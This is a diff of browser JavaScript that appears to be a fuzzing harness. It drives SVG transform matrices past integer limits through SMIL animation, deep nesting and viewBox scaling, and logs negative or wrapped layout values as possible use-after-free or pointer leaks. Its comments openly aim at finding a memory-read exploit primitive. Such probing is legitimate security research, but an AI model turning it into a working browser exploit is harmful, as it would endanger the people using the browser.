+  anim.setAttribute('to',(INT32_OVF+1000)+' 0');
+  anim.setAttribute('dur','0.2s');
+  anim.setAttribute('repeatCount','indefinite');
+  r.appendChild(anim);
+
+  var smSamples=[];
+  var smNeg=[];
+  var smZero=[];
+  var smIter=0;
+  var SM_ITERS=1000;
+
+  function smSample(){
+    if(smIter>=SM_ITERS){
+      anim.setAttribute('repeatCount','0');
+      var negRate=(smNeg.length/SM_ITERS*100).toFixed(2);
+      var zeroRate=(smZero.length/SM_ITERS*100).toFixed(2);
+      log('SM[1]: '+SM_ITERS+' samples. negatives='+smNeg.length+' ('+negRate+'%) zeros='+smZero.length+' ('+zeroRate+'%)',
+        (smNeg.length>0?'uaf — SMIL NEGATIVE CONFIRMED: '+smNeg.length+' hits':
+         smZero.length>0?'zero — SMIL ZERO: '+smZero.length+' hits':
+         'pass — no negatives'));
+      if(smNeg.length>0){
+        smNeg.slice(0,5).forEach(function(n,i){
+          log('SM[1]: neg #'+i+': iter='+n.iter+' BCR.x='+n.bx+' BCR.y='+n.by+
+            ' width='+n.w+' bits='+f64hex(n.bx),'uaf');
         });
-        log('MUT[2]: 5 MO callbacks. negative='+neg.length+' anomalous='+anom.length,
-          (neg.length>0?'uaf — NEGATIVE BCR IN MO CALLBACK!':
-           anom.length>0?'crit — ANOMALOUS IN MO: '+anom[0].bx:
-           'info'));
-        moBCRs.forEach(function(v,i){
-          log('MUT[2]:   flip '+i+': old='+v.old+' new='+v.new_e+' BCR.x='+v.bx,'info');
+        // critical: is the negative BCR.x a pointer-like value?
+        smNeg.forEach(function(n){
+          var hi=f64hi(n.bx);
+          if(hi>0&&hi<0xffff0000){
+            log('SM[1]: POINTER-LIKE HI BITS: BCR.x='+n.bx+' hi=0x'+hi.toString(16),'uaf — POSSIBLE POINTER LEAK IN BCR.x!');
+          }
         });
       }
+      svg.remove();
+      // SM[2]: after finding negatives, try to align the animation to maximize hits
+      if(smNeg.length>0)smAlign();
+      return;
     }
-  });
-  mo.observe(r2,{attributes:true,attributeFilter:['transform']});
-
-  // Trigger the observer by changing transform attribute
-  setTimeout(function(){mx2.e=INT32_MAX;},50);
-  setTimeout(function(){mx2.e=INT32_OVF;},100);
-  setTimeout(function(){mx2.e=INT32_MAX;},150);
-
-  svg.remove();
-}
-
-// ════════════════════════════════════════════════════════════════════════
-// STK — stacking context race: create/destroy stacking contexts while
-// matrix is at the threshold — can the paint layer snapshot a confused value?
-// ════════════════════════════════════════════════════════════════════════
-function runSTK(){
-  hdr('STK: stacking context creation/destruction at branch threshold');
-  var svg=mkSVG(100,100);
-  var r=mkRect(svg,0,0,10,10);
-  r.setAttribute('transform','matrix(1 0 0 1 0 0)');
-  var mx=r.transform.baseVal.getItem(0).matrix;
-
-  // STK[1]: add/remove will-change while at threshold
-  hdr('STK[1]: will-change:transform at INT32_OVF vs INT32_MAX');
-  var results=[];
-  for(var i=0;i<20;i++){
-    var onOvf=(i%2===0);
-    mx.e=onOvf?INT32_OVF:INT32_MAX;
-    // Force new stacking context
-    r.style.willChange='transform';
-    var b1=bcr(r);
-    // Destroy stacking context
-    r.style.willChange='auto';
-    var b2=bcr(r);
-    if(b1&&b2&&b1.x!==b2.x){
-      log('STK[1]: iter='+i+' will-change='+b1.x+' auto='+b2.x+' DIFF!',
-        (b1.x<0||b2.x<0?'uaf — NEGATIVE IN STACKING CTX!':'crit — DIFF: '+b1.x+' vs '+b2.x));
-    }
-    results.push({wc:b1?b1.x:null,auto:b2?b2.x:null});
-  }
-  var diffs=results.filter(function(r){return r.wc!==r.auto;});
-  log('STK[1]: 20 iters. stacking-ctx diffs='+diffs.length,diffs.length>0?'crit':'pass');
-
-  // STK[2]: opacity triggers stacking context — add/remove during threshold
-  hdr('STK[2]: opacity<1 stacking ctx at branch threshold');
-  var opResults=[];
-  for(var j=0;j<20;j++){
-    mx.e=(j%2===0)?INT32_OVF:INT32_MAX;
-    r.style.opacity='0.99';  // creates stacking context
-    var bo1=bcr(r);
-    r.style.opacity='1';     // removes it
-    var bo2=bcr(r);
-    opResults.push({op:bo1?bo1.x:null,norm:bo2?bo2.x:null});
-  }
-  var opDiffs=opResults.filter(function(r){return r.op!==r.norm;});
-  var opNegs=opResults.filter(function(r){return r.op<0||r.norm<0;});
-  log('STK[2]: 20 iters. diffs='+opDiffs.length+' negatives='+opNegs.length,
-    (opNegs.length>0?'uaf — NEGATIVE IN OPACITY STACKING!':opDiffs.length>0?'crit':'pass'));
-
-  // STK[3]: filter creates stacking context — extreme filter + threshold matrix
-  hdr('STK[3]: SVG filter (stacking ctx) + branch threshold matrix');
-  var defs=document.createElementNS(NS,'defs');
-  var filt=document.createElementNS(NS,'filter');
-  filt.setAttribute('id','v28filt');
-  var feBlur=document.createElementNS(NS,'feGaussianBlur');
-  feBlur.setAttribute('stdDeviation','0.1');
-  filt.appendChild(feBlur);
-  defs.appendChild(filt);
-  svg.appendChild(defs);
-
-  var filtResults=[];
-  for(var k=0;k<10;k++){
-    mx.e=(k%2===0)?INT32_OVF:INT32_MAX;
-    r.setAttribute('filter','url(#v28filt)');
-    var bf1=bcr(r);
-    r.removeAttribute('filter');
-    var bf2=bcr(r);
-    filtResults.push({filt:bf1?bf1.x:null,no:bf2?bf2.x:null});
-  }
-  var filtDiffs=filtResults.filter(function(v){return v.filt!==v.no;});
-  var filtNegs=filtResults.filter(function(v){return v.filt<0||v.no<0;});
-  log('STK[3]: 10 iters. filter diffs='+filtDiffs.length+' negatives='+filtNegs.length,
-    (filtNegs.length>0?'uaf — NEGATIVE WITH FILTER STACKING!':filtDiffs.length>0?'crit':'pass'));
-  if(filtDiffs.length>0)log('STK[3]: diff sample: filter='+filtDiffs[0].filt+' no-filter='+filtDiffs[0].no,'crit');
-
-  svg.remove();
-}
-
-// ════════════════════════════════════════════════════════════════════════
-// CTM — deep CTM read primitive: now that we know CTM tracks past 2^31
-// while BCR is frozen, can we use CTM to detect different code paths
-// and find any path that returns a negative/wrapped value?
-// ════════════════════════════════════════════════════════════════════════
-function runCTM(){
-  hdr('CTM: deep read primitive — hunting for CTM values that differ from BCR pattern');
-  var svg=mkSVG(100,100);
-  var r=mkRect(svg,0,0,10,10);
-  r.setAttribute('transform','matrix(1 0 0 1 0 0)');
-  var mx=r.transform.baseVal.getItem(0).matrix;
-
-  // CTM[1]: does CTM also saturate eventually, or does it track forever?
-  hdr('CTM[1]: CTM tracking range — where does CTM.e stop tracking linearly?');
-  var ctmTests=[
-    INT32_OVF, INT32_OVF*2, INT32_OVF*4,
-    1e10, 1e11, 1e12, 1e13, 1e14, 1e15,
-    1e20, 1e30, 1e38, 1e100, 1e200, 1e300,
-    Number.MAX_VALUE,
-    Number.MAX_SAFE_INTEGER,
-  ];
-  var prevCTM=null;
-  for(var i=0;i<ctmTests.length;i++){
-    mx.e=ctmTests[i];
-    var c=ctm(r);
-    var ce=c?c.e:null;
+    if(smIter%100===0)prog('SM: '+smIter+'/'+SM_ITERS);
     var b=bcr(r);
-    var bx=b?b.x:null;
-    var ctmLinear=(prevCTM===null||ce>prevCTM);  // is it still going up?
-    log('CTM[1]: e='+ctmTests[i].toExponential(3)+' CTM.e='+ce+' BCR.x='+bx,
-      (ce!==null&&ce<0&&ctmTests[i]>0?'uaf — CTM NEGATIVE! overflow in CTM pipeline!':
-       ce!==null&&ce===bx?'info — CTM==BCR':
-       ce!==null&&ce!==bx&&Math.abs(ctmTests[i])>LU_MAX?'star — CTM≠BCR: CTM='+ce+' BCR='+bx:
-       'info'));
-    prevCTM=ce;
+    if(b){
+      if(b.x<0)smNeg.push({iter:smIter,bx:b.x,by:b.y,w:b.width});
+      else if(b.x===0)smZero.push({iter:smIter});
+    }
+    smSamples.push(b?b.x:null);
+    smIter++;
+    setTimeout(smSample,8);
+  }
+  smSample();
+
+  // SM[2]: align animation timing to catch the exact negative frame
+  function smAlign(){
+    hdr('SM[2]: SMIL alignment test — sample at exact animation midpoint');
+    var svg2=mkSVG(100,100);
+    var r2=mkRect(svg2,0,0,10,10);
+    var anim2=document.createElementNS(NS,'animateTransform');
+    anim2.setAttribute('attributeName','transform');
+    anim2.setAttribute('type','translate');
+    anim2.setAttribute('from',(INT32_MAX-100)+' 0');
+    anim2.setAttribute('to',(INT32_OVF+100)+' 0');
+    anim2.setAttribute('dur','0.05s');  // faster = more time at boundary per second
+    anim2.setAttribute('repeatCount','indefinite');
+    r2.appendChild(anim2);
+
+    var alignNeg=[];var alignIter=0;
+    function alignSample(){
+      if(alignIter>=500){
+        log('SM[2]: 500 fast samples. negatives='+alignNeg.length,
+          (alignNeg.length>0?'uaf — FAST SMIL NEGATIVE: '+alignNeg.length+' at 50ms anim period!':'info'));
+        if(alignNeg.length>0){
+          alignNeg.slice(0,3).forEach(function(n,i){
+            log('SM[2]: neg #'+i+': BCR.x='+n.bx+' CTM.e='+n.ctm,'uaf');
+          });
+        }
+        svg2.remove();
+        return;
+      }
+      var b=bcr(r2);
+      var c=ctm(r2);
+      if(b&&b.x<0)alignNeg.push({bx:b.x,ctm:c?c.e:null,iter:alignIter});
+      alignIter++;
+      requestAnimationFrame(alignSample);
+    }
+    alignSample();
+  }
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// ND — deep nesting CTM read: v28 found CTM.e=6.44B at triple nest
+// Push deeper: 4, 5, 8, 16, 32 levels — does CTM.e wrap to negative?
+// ════════════════════════════════════════════════════════════════════════
+function runND(){
+  hdr('ND: deep nesting CTM compound — push to 32 levels');
+  var svg=mkSVG(100,100);
+
+  function makeNested(depth,parent){
+    if(depth===0){
+      return mkRect(parent,0,0,10,10);
+    }
+    var g=document.createElementNS(NS,'g');
+    g.setAttribute('transform','matrix(1 0 0 1 0 0)');
+    parent.appendChild(g);
+    return {g:g,child:makeNested(depth-1,g)};
+  }
+  function setAllMX(node,val){
+    if(!node)return;
+    if(node.g){
+      node.g.transform.baseVal.getItem(0).matrix.e=val;
+      setAllMX(node.child,val);
+    }
+  }
+  function getLeaf(node){
+    if(!node)return null;
+    if(node.g)return getLeaf(node.child);
+    return node;
   }
 
-  // CTM[2]: combine viewBox + matrix — does CTM compound them differently than BCR?
-  hdr('CTM[2]: viewBox amplification + matrix translate — CTM vs BCR compound behavior');
-  var svg2=mkSVG(100,100,'0 0 0.01 0.01');  // 1 unit = 10000px
+  var depths=[1,2,3,4,5,8,12,16,24,32];
+  hdr('ND[1]: increasing depth — CTM.e and BCR.x at each level');
+
+  for(var di=0;di<depths.length;di++){
+    var d=depths[di];
+    var tree=makeNested(d,svg);
+    var leaf=getLeaf(tree)||tree;
+    // set all groups to INT32_OVF
+    setAllMX(tree,INT32_OVF);
+
+    var c=ctm(leaf);
+    var b=bcr(leaf);
+    var ce=c?c.e:null;
+    var bx=b?b.x:null;
+    var expectedCTM=d*INT32_OVF;  // rough: compound translation
+
+    log('ND[1]: depth='+d+' CTM.e='+ce+' BCR.x='+bx+' expected~='+expectedCTM.toExponential(3),
+      (ce!==null&&ce<0?'uaf — CTM NEGATIVE AT DEPTH '+d+'! WRAP!':
+       bx!==null&&bx<0?'uaf — BCR NEGATIVE AT DEPTH '+d+'!':
+       ce!==null&&ce!==null&&ce<0.1*expectedCTM&&d>2?'crit — CTM WAY BELOW EXPECTED (clamping?): '+ce:
+       'star — CTM='+ce));
+
+    // is CTM.e representable as a finite float?
+    if(ce!==null){
+      var hiB=f64hi(ce);
+      if(hiB===0x7ff00000||hiB===0xfff00000)log('ND[1]:   depth='+d+' CTM.e is Infinity!','crit');
+      if((hiB&0x7ff00000)===0x7ff00000&&hiB!==0x7ff00000)log('ND[1]:   depth='+d+' CTM.e is NaN!','crit');
+    }
+  }
+
+  // ND[2]: mixed path — some levels at INT32_OVF, some at INT32_MAX
+  hdr('ND[2]: alternating paths at each nesting level');
+  var tree2=makeNested(8,svg);
+  // manually alternate: odd levels at INT32_OVF, even at INT32_MAX
+  function setAlternating(node,depth){
+    if(!node||!node.g)return;
+    node.g.transform.baseVal.getItem(0).matrix.e=(depth%2===0?INT32_OVF:INT32_MAX);
+    setAlternating(node.child,depth+1);
+  }
+  setAlternating(tree2,0);
+  var leaf2=getLeaf(tree2)||tree2;
+  var c2=ctm(leaf2);var b2=bcr(leaf2);
+  log('ND[2]: alternating 8-deep: CTM.e='+(c2?c2.e:null)+' BCR.x='+(b2?b2.x:null),
+    (c2&&c2.e<0?'uaf — ALTERNATING NESTING CTM NEGATIVE!':
+     b2&&b2.x<0?'uaf — ALTERNATING NESTING BCR NEGATIVE!':
+     'info'));
+
+  svg.remove();
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// CT — CTM as exploit primitive: if we can get CTM to return a value
+// that reflects internal layout state, can we use it to read memory?
+// Focus: CTM when BCR=0 (from RO suite), CTM at animation crossing,
+// CTM.f (y-axis) vs CTM.e (x-axis) behavior differences
+// ════════════════════════════════════════════════════════════════════════
+function runCT(){
+  hdr('CT: CTM as read primitive — exploit primitive characterization');
+  var svg=mkSVG(100,100);
+  var r=mkRect(svg,0,0,10,10);
+  getMX(r);
+  var mx=r.transform.baseVal.getItem(0).matrix;
+
+  // CT[1]: does CTM.f (y translation) behave the same as CTM.e (x)?
+  hdr('CT[1]: CTM.f vs CTM.e — axis asymmetry');
+  var axisTests=[0,LU_MAX,INT32_MAX,INT32_OVF,1e10,1e15,1e30,Number.MAX_VALUE];
+  for(var i=0;i<axisTests.length;i++){
+    var v=axisTests[i];
+    mx.e=v;mx.f=0;
+    var c1=ctm(r);
+    var b1=bcr(r);
+    mx.e=0;mx.f=v;
+    var c2=ctm(r);
+    var b2=bcr(r);
+    var asymE=c1?c1.e:null, asymF=c2?c2.f:null;
+    log('CT[1]: val='+v.toExponential(3)+' X: CTM.e='+asymE+' BCR.x='+(b1?b1.x:null)+
+      ' | Y: CTM.f='+asymF+' BCR.y='+(b2?b2.y:null),
+      (asymE!==asymF&&Math.abs(v)>LU_MAX?'crit — X/Y ASYMMETRY: CTM.e='+asymE+' CTM.f='+asymF:
+       asymE!==null&&asymE<0?'uaf — CTM.e NEGATIVE!':
+       asymF!==null&&asymF<0?'uaf — CTM.f NEGATIVE!':
+       'info'));
+  }
+
+  // CT[2]: CTM matrix fields during viewBox amplification — all 6 fields
+  hdr('CT[2]: full CTM matrix at INT32_OVF in viewBox space');
+  var svg2=mkSVG(100,100,'0 0 0.01 0.01');
   var r2=mkRect(svg2,0,0,0.1,0.1);
-  r2.setAttribute('transform','matrix(1 0 0 1 0 0)');
+  getMX(r2);
   var mx2=r2.transform.baseVal.getItem(0).matrix;
 
-  // Matrix translate in SVG user space + viewBox amplification
-  // If mx2.e = 1000 SVG units, and viewBox makes 1 SVG unit = 10000px
-  // then screen translation = 10M px
-  var vbMXTests=[
-    {t:0, note:'baseline'},
-    {t:100, note:'100 units → 1M px'},
-    {t:3355, note:'3355 units → 33.55M px (LU zone)'},
-    {t:3356, note:'3356 units → just past LU_MAX'},
-    {t:10000, note:'10K units → 100M px'},
-    {t:100000, note:'100K units → 1B px'},
-    {t:214748, note:'214748 → 2.14B px (near INT32)'},
-    {t:214749, note:'214749 → just past INT32 threshold'},
-    {t:215000, note:'215K → well past INT32'},
-    {t:1000000, note:'1M units → 10B px'},
-  ];
-  for(var j=0;j<vbMXTests.length;j++){
-    var vt=vbMXTests[j];
-    mx2.e=vt.t;
-    var c2=ctm(r2);
-    var b2=bcr(r2);
-    var ce2=c2?c2.e:null;
-    var bx2=b2?b2.x:null;
-    var expPx=vt.t*10000;
-    log('CTM[2]: ['+vt.note+']\n  exp='+expPx.toExponential(3)+' CTM.e='+ce2+' BCR.x='+bx2,
-      (ce2!==null&&ce2<0&&expPx>0?'uaf — CTM NEGATIVE IN VIEWBOX+MX!':
-       ce2!==null&&bx2!==null&&ce2>bx2&&bx2===INT32_OVF?'star — CTM PAST 2^31 WHILE BCR FROZEN: CTM='+ce2:
-       ce2!==null&&bx2!==null&&Math.round(ce2)!==bx2&&expPx>LU_MAX?'star — CTM≠BCR discrepancy: CTM='+ce2+' BCR='+bx2:
-       'info'));
+  var vbProbes=[0,100,200000,214748,214749,300000,1000000];
+  for(var j=0;j<vbProbes.length;j++){
+    mx2.e=vbProbes[j];
+    var c=ctm(r2);
+    var b=bcr(r2);
+    if(c){
+      log('CT[2]: mx.e='+vbProbes[j]+
+        ' CTM:[a='+c.a.toFixed(4)+' b='+c.b+' c='+c.c+' d='+c.d.toFixed(4)+
+        ' e='+c.e+' f='+c.f+'] BCR.x='+(b?b.x:null),
+        (c.e<0&&vbProbes[j]>0?'uaf — CTM.e NEGATIVE IN VIEWBOX!':
+         c.e>INT32_OVF&&b&&b.x===INT32_OVF?'star — CTM PAST 2^31 WHILE BCR FROZEN: '+c.e:
+         'info'));
+    }
   }
 
-  // CTM[3]: negative matrix translate in viewBox space — does CTM track negative past -2^31?
-  hdr('CTM[3]: negative translate in viewBox space — CTM tracking range');
-  var negVBTests=[-100,-3355,-3356,-10000,-214748,-214749,-1000000];
-  for(var k=0;k<negVBTests.length;k++){
-    mx2.e=negVBTests[k];
-    var c3=ctm(r2);
-    var b3=bcr(r2);
-    log('CTM[3]: mx.e='+negVBTests[k]+' exp='+(negVBTests[k]*10000).toExponential(3)+' CTM.e='+(c3?c3.e:null)+' BCR.x='+(b3?b3.x:null),
-      (c3&&c3.e>0&&negVBTests[k]<0?'uaf — CTM POSITIVE FROM NEGATIVE! WRAP!':
-       c3&&c3.e<-INT32_OVF?'star — CTM past -2^31: '+c3.e:'info'));
+  // CT[3]: CTM scale fields (a,d) at pathological values
+  hdr('CT[3]: CTM scale fields a/d overflow — pathological scale factor');
+  var mx3=getMX(r);
+  var scaleTests=[1,1000,1e6,1e9,1e12,1e15,1e30,Number.MAX_VALUE,Infinity,NaN];
+  for(var k=0;k<scaleTests.length;k++){
+    var s=scaleTests[k];
+    try{
+      mx3.a=s;mx3.d=s;mx3.e=0;mx3.f=0;
+      var c3=ctm(r);
+      var b3=bcr(r);
+      log('CT[3]: scale='+s+' CTM.a='+( c3?c3.a:null)+' CTM.e='+(c3?c3.e:null)+' BCR.x='+(b3?b3.x:null),
+        (c3&&(c3.a!==c3.d)?'crit — CTM a!=d with scale '+s+': a='+c3.a+' d='+c3.d:
+         'info'));
+    }catch(e){
+      log('CT[3]: scale='+s+' THREW: '+e.message,'warn');
+    }
   }
 
   svg.remove();svg2.remove();
